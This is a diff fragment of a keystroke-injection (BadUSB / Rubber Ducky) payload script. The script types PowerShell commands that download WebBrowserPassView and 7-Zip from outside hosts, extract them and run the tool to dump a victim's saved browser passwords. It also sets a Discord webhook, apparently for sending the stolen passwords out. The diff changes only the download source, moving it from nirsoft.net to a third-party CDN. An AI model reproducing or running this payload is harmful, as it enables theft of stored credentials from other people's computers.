@@ -7,7 +7,7 @@ DELAY 1500
 STRING $webhook='%DISCORD_WEBHOOK%'
 ENTER
 DELAY 500
-STRING mkdir \temp ; cd \temp ; Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip ; Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e wbpv.zip * -p"wbpv28821@"; .\WebBrowserPassView.exe
+STRING mkdir \temp ; cd \temp ; Invoke-WebRequest -Uri https://cdn.lullaby.cafe/file/webpassview.zip -OutFile webpassview.zip ; Invoke-WebRequest -Uri https://cdn.lullaby.cafe/file/7z.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e webpassview.zip; .\WebBrowserPassView.exe
 ENTER
 DELAY 10000
 CTRL A
